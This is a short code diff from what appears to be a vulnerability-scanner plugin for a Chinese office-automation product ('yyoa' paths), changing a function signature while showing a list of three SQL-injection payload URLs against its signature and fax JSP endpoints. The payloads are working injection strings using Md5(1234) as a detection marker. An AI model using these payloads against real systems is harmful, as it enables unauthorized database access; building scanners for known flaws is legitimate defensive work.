@@ -24,7 +24,7 @@ class VulnerabilityInfo(object):
 payloads = ["/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23",
                     "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
                     "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--"]
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
+def medusa(**kwargs)->None:
     url = kwargs.get("Url")  # 获取传入的url参数
     Headers = kwargs.get("Headers")  # 获取传入的头文件
     proxies = kwargs.get("Proxies")  # 获取传入的代理参数
